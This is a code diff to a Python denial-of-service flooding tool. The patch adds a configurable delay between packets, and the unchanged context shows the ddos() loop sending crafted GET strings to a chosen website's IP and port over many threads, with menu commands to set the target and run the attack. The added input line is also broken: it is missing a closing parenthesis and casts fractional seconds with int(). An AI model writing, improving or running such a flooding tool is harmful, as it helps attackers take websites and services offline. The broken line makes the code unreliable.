@@ -18,6 +18,7 @@ port = 80
 messages = 'hello its me'
 threads = 12
 rtxt = 1
+sleepy = 0
 
 outtxt = "true"
 modeh = "false"
@@ -50,6 +51,7 @@ def ddos():
           mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
           if outtxt == 'true':
              print("\033[1;32;40m\nSuccess!")
+          time.sleep(sleepy)
       except socket.error:
             print("\033[1;31;40m\nFailed Connection killed!, please wait....")
             
@@ -95,6 +97,7 @@ while i < 6:
     set mode h  = Set mode to Hadcore to exit mode,change message.
     set web     = Set ip of website (set web). 
     set r       = Repeat text.
+    set sleep   = Set waiting time between sends in Seconds. (= Default 0)
     get port i  = Get port of ip (get port i)
     get port w  = Get port of web (get port w).
     run         = To run
@@ -185,6 +188,10 @@ while i < 6:
       else:
          print("\033[1;32;40menabled")
          outtxt = 'true'
+      print(" ")
+   elif com == 'set sleep':
+      print(" ")
+      sleepy = int(raw_input("\033[1;32;40mTime in Seconds (=0.5,...): ")
       print(" ")
    else:
       print("""\033[1;32;40m
